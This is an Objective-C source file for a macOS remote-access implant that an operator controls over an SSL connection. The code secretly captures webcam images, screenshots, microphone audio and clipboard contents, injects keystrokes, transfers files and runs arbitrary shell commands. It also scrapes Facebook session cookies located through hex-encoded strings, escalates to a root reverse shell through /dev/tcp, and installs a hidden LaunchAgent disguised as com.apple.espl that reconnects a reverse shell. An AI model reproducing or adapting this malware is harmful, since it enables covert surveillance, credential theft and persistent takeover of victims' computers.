//
//  espl.m
//  esplmacos
//
//  Created by Lucas Jackson on 8/7/17.
//  Copyright © 2017 neoneggplant. All rights reserved.
//

#include "espl.h"

@implementation espl

@synthesize fileManager;
NSPipe *stdinPipe;
bool sysTaskRunning = false;

-(id)init {
    fileManager = [[NSFileManager alloc] init];
    NSLog(@"NSHomeDirectory() %@",NSHomeDirectory());
    [fileManager changeCurrentDirectoryPath:NSHomeDirectory()];
    return self;
}

-(NSDictionary *)getDirectoryContents:(NSString *)path {
    NSMutableDictionary *results = [[NSMutableDictionary alloc] init];
    const char * searchDir= [path UTF8String];
    DIR *dp;
    struct dirent *ep;
    dp = opendir(searchDir);
    if (dp != NULL) {
        while ((ep = readdir(dp))) {
            [results setValue:[NSNumber numberWithUnsignedInteger:ep->d_type] forKey:[NSString stringWithFormat:@"%s",ep->d_name]];
        }
    } else {
        return nil;
    }
    return results;
}

-(void)listDirectory:(NSString *)path {
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:path isDirectory:&isdir]) {
        if (isdir) {
            NSDictionary *results = [self getDirectoryContents:path];
            NSData *jsonData = [NSJSONSerialization dataWithJSONObject:results options:0 error:nil];
            [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
        } else {
            [self sendString:[NSString stringWithFormat:@"%@: is a file",path]];
        }
    } else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",path]];
    }
    [self term];
}

-(void)tabComplete:(NSString *)path {
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:[self getDirectoryContents:path] options:0 error:nil];
    [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
    [self term];
}

//MARK: Picture Data
-(void)takePicture {
    __block bool done = false;
    __block NSData *bImageData;
    [self captureImageWithBlock:^(NSData *imageData)
     {
         if (imageData) {
             NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
             [result setValue:[NSNumber numberWithInt:(int)imageData.length] forKey:@"size"];
             [result setValue:[NSNumber numberWithInt:1] forKey:@"status"];
             NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil];
             [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
             [self term];
         } else {
             [self sendString:@"{\"status\":0}"];
         }
         bImageData = [[NSData alloc] initWithData:imageData];
         [self sendData:bImageData];
         done = true;
     }];
    while (!done) {
        [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.05]];
    }
}


- (AVCaptureDevice *)getcapturedevice {
    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
    AVCaptureDevice *captureDevice = nil;
    for (AVCaptureDevice *device in videoDevices){
        if (device.position == AVCaptureDevicePositionUnspecified){
            captureDevice = device;
            break;
        }
    }
    return captureDevice;
}


-(void)idleTime {
    //returns number of seconds
    int64_t idlesecs = -1;
    io_iterator_t iter = 0;
    if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iter) == KERN_SUCCESS) {
        io_registry_entry_t entry = IOIteratorNext(iter);
        if (entry) {
            CFMutableDictionaryRef dict = NULL;
            if (IORegistryEntryCreateCFProperties(entry, &dict, kCFAllocatorDefault, 0) == KERN_SUCCESS) {
                CFNumberRef obj = CFDictionaryGetValue(dict, CFSTR("HIDIdleTime"));
                if (obj) {
                    int64_t nanoseconds = 0;
                    if (CFNumberGetValue(obj, kCFNumberSInt64Type, &nanoseconds)) {
                        idlesecs = (nanoseconds >> 30); // Divide by 10^9 to convert from nanoseconds to seconds.
                    }
                }
                CFRelease(dict);
            }
            IOObjectRelease(entry);
        }
        IOObjectRelease(iter);
    }
    [self sendString:[NSString stringWithFormat:@"%lld (seconds)",idlesecs]];
    [self term];
}
    
-(void)getPasteBoard {
    NSPasteboard *myPasteboard  = [NSPasteboard generalPasteboard];
    NSString *contents = [myPasteboard  stringForType:NSPasteboardTypeString];
    if (contents == nil) {
        [self sendString:@"nil"];
    }
    [self sendString:contents];
    [self term];
}
    
-(void)keyStroke:(NSString *)key {
    NSString *keyCommand = [NSString stringWithFormat:@"tell application \"System Events\"\nkeystroke \"%@\"\nend tell",key];
    [self runAppleScript:keyCommand];
    [self term];
}

-(void)getFacebook {
    NSString *result = @"";
    int fb_cuser[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6f, 0x6f, 0x6b,
        0x2e, 0x63, 0x6f, 0x6d, 0x00, 0x63, 0x5f, 0x75,
        0x73, 0x65, 0x72, 0x00, 0x2f, 0x00};
    NSString *cuser = [NSString stringWithFormat:@"%s",parseBinary(fb_cuser,22)];
    result = [NSString stringWithFormat:@"c_user = %@\n",cuser];
    
    int fb_xs[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6F, 0x6F, 0x6B,
        0x2E, 0x63, 0x6F, 0x6D, 0x00, 0x78, 0x73, 0x00,
        0x2f, 0x00}; //facebook.com xs /
    result = [NSString stringWithFormat:@"%@xs = %s\n",result,parseBinary(fb_xs,18)];
    result = [NSString stringWithFormat:@"%@http://facebook.com/%@",result,cuser];
    [self sendString:result];
    [self term];
}

-(void)screenshot {
    CGImageRef screenShot = CGWindowListCreateImage(CGRectInfinite, kCGWindowListOptionOnScreenOnly, kCGNormalWindowLevel, kCGWindowImageDefault);
    NSBitmapImageRep *bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:screenShot];
    // Create an NSImage and add the bitmap rep to it...
    NSImage *image = [[NSImage alloc] init];
    [image addRepresentation:bitmapRep];
    NSData *imageData = [image TIFFRepresentation];
    //convert to jpeg
    NSBitmapImageRep *imageRep = [NSBitmapImageRep imageRepWithData:imageData];
    NSNumber *compressionFactor = [NSNumber numberWithFloat:0.9];
    NSDictionary *imageProps = [NSDictionary dictionaryWithObject:compressionFactor forKey:NSImageCompressionFactor];
    imageData = [imageRep representationUsingType:NSJPEGFileType properties:imageProps];
    
    NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
    if (imageData != nil) {
        [result setValue:[NSNumber numberWithInt:(int)imageData.length] forKey:@"size"];
        [result setValue:[NSNumber numberWithInt:1] forKey:@"status"];
        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil];
        [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
        [self term];
        [self sendData:imageData];
    } else {
        [result setValue:@"Unable to get screenshot" forKey:@"error"];
        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil];
        [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
        [self term];
    }
    
}

-(void)getProcessId {
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    [self sendString:[NSString stringWithFormat:@"%d",processID]];
    [self term];
}

-(NSString *)macAddress {
    kern_return_t           kr          = KERN_SUCCESS;
    CFMutableDictionaryRef  matching    = NULL;
    io_iterator_t           iterator    = IO_OBJECT_NULL;
    io_object_t             service     = IO_OBJECT_NULL;
    CFDataRef               result      = NULL;
    
    matching = IOBSDNameMatching( kIOMasterPortDefault, 0, "en0" );
    if ( matching == NULL )
    {
        fprintf( stderr, "IOBSDNameMatching() returned empty dictionary\n" );
        return ( NULL );
    }
    
    kr = IOServiceGetMatchingServices( kIOMasterPortDefault, matching, &iterator );
    if ( kr != KERN_SUCCESS )
    {
        fprintf( stderr, "IOServiceGetMatchingServices() returned %d\n", kr );
        return ( NULL );
    }
    
    while ( (service = IOIteratorNext(iterator)) != IO_OBJECT_NULL )
    {
        io_object_t parent = IO_OBJECT_NULL;
        
        kr = IORegistryEntryGetParentEntry( service, kIOServicePlane, &parent );
        if ( kr == KERN_SUCCESS )
        {
            if ( result != NULL )
                CFRelease( result );
            
            result = IORegistryEntryCreateCFProperty( parent, CFSTR("IOMACAddress"), kCFAllocatorDefault, 0 );
            IOObjectRelease( parent );
        }
        else
        {
            fprintf( stderr, "IORegistryGetParentEntry returned %d\n", kr );
        }
        
        IOObjectRelease( service );
    }
    
    NSData * macData = (__bridge NSData *)(result);
    if ( [macData length] == 0 )
        return ( nil );
    
    const UInt8 *bytes = [macData bytes];
    
    NSMutableString *resultMutableString = [NSMutableString string];
    for ( NSUInteger i = 0; i < [macData length]; i++ )
    {
        if ( [resultMutableString length] != 0 )
            [resultMutableString appendFormat: @":%02hhx", bytes[i]];
        else
            [resultMutableString appendFormat: @"%02hhx", bytes[i]];
    }
    return ( [resultMutableString copy] );
}



-(void)setBrightness:(NSString *)arg {
    if ([arg isEqualToString:@""]) {
        [self sendString:@"Usage: brightness 0.x"];
        return;
    }
    const int kMaxDisplays = 16;
    const CFStringRef kDisplayBrightness = CFSTR(kIODisplayBrightnessKey);
    
    CGDirectDisplayID display[kMaxDisplays];
    CGDisplayCount numDisplays;
    CGDisplayErr err;
    err = CGGetActiveDisplayList(kMaxDisplays, display, &numDisplays);
    
    if (err != CGDisplayNoErr) {
        [self term];
        return;
    }
    for (CGDisplayCount i = 0; i < numDisplays; ++i) {
        CGDirectDisplayID dspy = display[i];
        CFDictionaryRef originalMode = CGDisplayCurrentMode(dspy);
        io_service_t service = CGDisplayIOServicePort(dspy);
        
        float brightness;
        err= IODisplayGetFloatParameter(service,
                                        kNilOptions, kDisplayBrightness,
                                        &brightness);
        IODisplaySetFloatParameter(service, kNilOptions, kDisplayBrightness, [arg floatValue]);
    }
    [self term];
}


-(void)mic:(NSString *)arg {
    if ([arg isEqualTo:@"record"]) {
        NSError *err = nil;
        [self initmic:err];
        if (err) {
            [self sendString:err.localizedDescription];
        } else {
            [self.audioRecorder record];
            [self sendString:@"Listening..."];
            
        }
    } else if ([arg isEqualTo:@"stop"]) {
        if ([self.audioRecorder isRecording]) {
            [self.audioRecorder stop];
            //send confirmation
            [self sendString:@"{\"status\":1}"];
        } else {
            [self sendString:@"{\"error\":\"Not currently recording\"}"];
        }
    }
    [self term];
}

-(void)initmic:(NSError *)error {
    NSURL *soundFile;
    NSDictionary *soundSetting;
    soundFile = [NSURL fileURLWithPath: @"/tmp/.avatmp"];
    soundSetting = [NSDictionary dictionaryWithObjectsAndKeys:
                    [NSNumber numberWithFloat: 44100.0],AVSampleRateKey,
                    [NSNumber numberWithInt: kAudioFormatMPEG4AAC],AVFormatIDKey,
                    [NSNumber numberWithInt: 2],AVNumberOfChannelsKey,
                    [NSNumber numberWithInt: AVAudioQualityHigh],AVEncoderAudioQualityKey, nil];
    self.audioRecorder = [[AVAudioRecorder alloc] initWithURL: soundFile settings: soundSetting error: &error];
}

    
-(bool)initcamera {
    self.session = [[AVCaptureSession alloc] init];
    self.session.sessionPreset = AVCaptureSessionPreset352x288;
    AVCaptureDevice *device = nil;
    NSError *error = nil;
    device = [self getcapturedevice];
    
    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];
    if (!input) {
        NSLog(@"ERROR: trying to open camera: %@", error);
        return false;
    } else {
        [self.session addInput:input];
        self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
        NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
        [self.stillImageOutput setOutputSettings:outputSettings];
        [self.session addOutput:self.stillImageOutput];
        [self.session startRunning];
        [NSThread sleepForTimeInterval:1];
        return true;
    }
}

-(void)captureImageWithBlock:(void (^)(NSData *))imageData {
    if ([self initcamera] == false) {
        return imageData(nil);
    }
    
    AVCaptureConnection* videoConnection = nil;
    for (AVCaptureConnection* connection in self.stillImageOutput.connections)
    {
        for (AVCaptureInputPort* port in [connection inputPorts])
        {
            if ([[port mediaType] isEqual:AVMediaTypeVideo])
            {
                videoConnection = connection;
                break;
            }
        }
        if (videoConnection)
            break;
    }
    if (videoConnection == nil) {
        return imageData(nil);
    }
    
    //capture still image from video connection
    [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
     {
         dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
             [self.session stopRunning];
             AVCaptureInput* input = [self.session.inputs objectAtIndex:0];
             [self.session removeInput:input];
             AVCaptureVideoDataOutput* output = (AVCaptureVideoDataOutput*)[self.session.outputs objectAtIndex:0];
             [self.session removeOutput:output];
         });
         
         if (error)
             imageData(nil);
         
         NSData* data = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
         if (data) {
             imageData(data);
         } else {
             imageData(nil);
         }
     }];
}


//MARK: Data Handling
char lastBytes[64];
char* parseBinary(int* searchChars,int sizeOfSearch) {
    NSString *cookieJarPath = [NSString stringWithFormat:@"%@/Library/Cookies/Cookies.binarycookies",NSHomeDirectory()];
    FILE *cookieJar = fopen([cookieJarPath UTF8String], "rb+");
    fseek(cookieJar, 0L, SEEK_END);
    long cookieJarSize = ftell(cookieJar);
    int pos = 0; int curSearch = 0;int curChar;
    fseek(cookieJar, 0, 0);
    
    while(pos <= cookieJarSize) {
        curChar = getc(cookieJar);pos++;
        
        if(curChar == searchChars[curSearch]) { /* found a match */
            curSearch++;                        /* search for next char */
            if(curSearch > sizeOfSearch - 1) {                 /* found the whole string! */
                curSearch = 0;                  /* start searching again */
                fread(lastBytes,1,64,cookieJar); /* read 5 bytes */
                return lastBytes;
            }
            
        } else { /* didn't find a match */
            if (curSearch > 18) {
                printf("fuck %d\n",searchChars[curSearch]);
            }
            curSearch = 0;                     /* go back to searching for first char */
        }
    };
    return "null";
}

-(void)sendFile:(NSString *)path {
    BOOL isDir;
    if ([self.fileManager fileExistsAtPath:path isDirectory:&isDir]) {
        if (isDir) {
            [self sendString:@"{\"status\":2}"];
            [self term];
        } else {
            NSData *data = [self.fileManager contentsAtPath:path];
            NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
            [result setValue:[NSNumber numberWithInt:(int)data.length] forKey:@"size"];
            [result setValue:[NSNumber numberWithInt:1] forKey:@"status"];
            NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil];
            //send json, send term
            [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
            [self term];
            
            //receive term, send data, and then new term
            [self sendData:data];
        }
    } else {
        [self sendString:@"{\"status\":0}"];
        [self term];
    }
}

-(void)sendData:(NSData *)data {
    NSString *end = [self receiveString:10];
    SSL_write(client_ssl, [data bytes], (int)data.length);
    SSL_write(client_ssl, [end UTF8String], (int)end.length);
}

-(void)receiveFile:(NSString *)args {
    NSData *jsonData = [args dataUsingEncoding:NSUTF8StringEncoding];
    NSMutableDictionary *uploadargs = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
    long size = [[uploadargs valueForKey:@"size"] integerValue];
    NSString *uploadPath = [NSString stringWithFormat:@"%@",[uploadargs valueForKey:@"path"]];
    NSString *fileName = [NSString stringWithFormat:@"%@",[uploadargs valueForKey:@"filename"]];
    NSData *data = [self receiveData:size];
    [data writeToFile:[NSString stringWithFormat:@"%@/%@",uploadPath,fileName] atomically:true];
}

-(NSData *)receiveData:(long)size {
    NSMutableData *data = [NSMutableData alloc];
    char buffer[1024] = "";
    while (SSL_read(client_ssl, &buffer, sizeof(buffer))) {
        [data appendBytes:buffer length:sizeof(buffer)];
        if (strstr(buffer,terminator)) {
            break;
        }
        memset(buffer,'\0',1024);
    };
    [self debugLog:[NSString stringWithFormat:@"data size = %lu",[data subdataWithRange:NSMakeRange(0, size)].length]];
    return [data subdataWithRange:NSMakeRange(0, size)];
}

//MARK: Navigation
-(void)changeDirectory:(NSString *)dir {
    NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
    NSString *path = NSHomeDirectory();
    if (![dir isEqual: @""]) {
        path = dir;
    }
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:path isDirectory:&isdir]) {
        if (isdir) {
            [fileManager changeCurrentDirectoryPath:path];
            [result setValue:[fileManager currentDirectoryPath] forKey:@"current_directory"];
        } else {
            [result setValue:[NSString stringWithFormat:@"%@: Not a directory\n",path] forKey:@"error"];
        }
    } else {
        [result setValue:[NSString stringWithFormat:@"%@: No such file or directory\n",path] forKey:@"error"];
    }
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil];
    [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
    [self term];
}

-(void)killTask {
    if (sysTaskRunning) {
        sysTaskRunning = false;
        [_systask terminate];
    }
    [self term];
}

-(void)runTask:(NSString *)cmd :(bool)sendTerm {
    if (sysTaskRunning) {
        //if sys task is running, write to stdin filehandle
        [stdinPipe.fileHandleForWriting writeData:[cmd dataUsingEncoding:NSUTF8StringEncoding]];
    } else {
            //dispatch to allow future killswitch
            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                //split cmd by ";" run each separately (this isn't ideal - while true; do echo smh; done)
                NSArray *cmdArray = [cmd componentsSeparatedByString:@";"];
                NSEnumerator *e = [cmdArray objectEnumerator];
                id object;
                sysTaskRunning = true;
                while ((object = [e nextObject]) && sysTaskRunning) {
                    NSLog(@"running task %@",object);
                    _systask = [[NSTask alloc] init];
                    [_systask setLaunchPath:@"/bin/bash"];
                    [_systask setArguments:@[ @"-c", object]];
                    [_systask setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
                    
                    NSPipe *stdoutPipe = [NSPipe pipe];
                    stdinPipe = [NSPipe pipe];
                    [_systask setStandardInput:stdinPipe];
                    [_systask setStandardOutput:stdoutPipe];
                    [_systask setStandardError:stdoutPipe];
                    NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
                    [stdoutHandle waitForDataInBackgroundAndNotify];
                    id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
                                                                                    object:stdoutHandle queue:nil
                                                                                usingBlock:^(NSNotification *note)
                                   {
                                       NSData *dataRead;
                                       while((dataRead = [stdoutHandle availableData]) && dataRead.length > 0) {
                                           NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
                                           [self sendString:newOutput];
                                       }
                                       [stdoutHandle waitForDataInBackgroundAndNotify];
                                   }];
                    [_systask launch];
                    [_systask waitUntilExit];
                    [[NSNotificationCenter defaultCenter] removeObserver:observer];
                }
                if (sysTaskRunning) {
                    if (sendTerm) {
                        [self term];
                    }
                    sysTaskRunning = false;
                }
            });
    }
}

-(void)su:(NSString *)pass :(NSString *)ip :(int)port {
    __block NSString *result = @"";
    sysTaskRunning = true;
    _systask = [[NSTask alloc] init];
    [_systask setLaunchPath:@"/bin/bash"];
    [_systask setArguments:@[ @"-c", [NSString stringWithFormat:@"echo '%@' | sudo -S whoami",pass]]];
    [_systask setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
    
    NSPipe *stdoutPipe = [NSPipe pipe];
    [_systask setStandardOutput:stdoutPipe];
    [_systask setStandardError:stdoutPipe];
    
    NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
    [stdoutHandle waitForDataInBackgroundAndNotify];
    id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
                                                                    object:stdoutHandle queue:nil
                                                                usingBlock:^(NSNotification *note)
                   {
                       NSData *dataRead = [stdoutHandle availableData];
                       NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
                       result = [NSString stringWithFormat:@"%@%@",result,newOutput];
                       
                       [stdoutHandle waitForDataInBackgroundAndNotify];
                   }];
    [_systask launch];
    [_systask waitUntilExit];
    [[NSNotificationCenter defaultCenter] removeObserver:observer];
    sysTaskRunning = false;
    [self sendString:result];
    [self term];
    if (!([result rangeOfString:@"root"].location == NSNotFound)) {
        sleep(1);
        system([[NSString stringWithFormat:@"killall espl;echo '%@' | sudo -S bash &> /dev/tcp/%@/%d 0>&1 2>/dev/null",pass,ip,port] UTF8String]);
        exit(0);
    }
}
    
-(void)debugLog:(NSString *)string {
    system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",string] UTF8String]);
}


//MARK: AppleScript
-(void)runAppleScript:(NSString *)args {
    [self debugLog:@"running appleScript"];
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        NSAppleScript *aps = [[NSAppleScript alloc] initWithSource:args];
        NSDictionary *error;
        NSAppleEventDescriptor *asDescriptor = [aps executeAndReturnError:&error];
        if (error != nil) {
            [self sendString:[NSString stringWithFormat:@"%@",error]];
        } else if ([asDescriptor stringValue]) {
            [self sendString:[NSString stringWithFormat:@"%@",[asDescriptor stringValue]]];
        }
        [self term];
    });
}

-(void)persistence:(NSString *)args :(NSString *)ip :(int)port {
    NSString *esplPath = [NSString stringWithFormat:@"%@/Library/LaunchAgents/.espl.plist",NSHomeDirectory()];
    if ([args isEqualToString:@"install"]) {
        NSDictionary *innerDict = [NSDictionary dictionaryWithObjects:
                        [NSArray arrayWithObjects: [NSNumber numberWithBool: YES],@"com.apple.espl",[NSNumber numberWithInt:5],[NSNumber numberWithBool: YES],
                         [NSArray arrayWithObjects:@"sh",@"-c",[NSString stringWithFormat:@"bash &> /dev/tcp/%@/%d 0>&1",ip,port], nil], nil]
                        forKeys:[NSArray arrayWithObjects:@"AbandonProcessGroup",@"Label",@"StartInterval",@"RunAtLoad",@"ProgramArguments", nil]];
        
        NSError *err;
        NSData *plistData = [NSPropertyListSerialization dataWithPropertyList:innerDict format:NSPropertyListXMLFormat_v1_0 options:0 error:&err];
        if (err) {
            [self sendString:[NSString stringWithFormat:@"%@",err.localizedDescription]];
        }
        [plistData writeToFile:esplPath atomically:true];
        [self runTask:@"sleep 1;launchctl unload ~/Library/LaunchAgents/.espl.plist;launchctl load ~/Library/LaunchAgents/.espl.plist":false];
    } else if ([args isEqualToString:@"uninstall"]) {
        if ([self.fileManager fileExistsAtPath:esplPath]) {
            [self runTask:@"launchctl unload ~/Library/LaunchAgents/.espl.plist 2>/dev/null; rm ~/Library/LaunchAgents/.espl.plist":false];
        }
    } else {
        [self sendString:@"Unknown Option"];
    }
    [self term];
}

-(void)term {
    SSL_write(client_ssl, terminator, (int)strlen(terminator));
}

-(void)sendString:(NSString *)str {
    SSL_write(client_ssl, [str UTF8String], (int)str.length);
}

-(NSString *)receiveString:(int)length {
    char buffer[length];
    SSL_read(client_ssl, &buffer, length + 1);
    NSString *result = [NSString stringWithFormat:@"%s",buffer];
    memset(buffer,'\0',length);
    return result;
}

@end
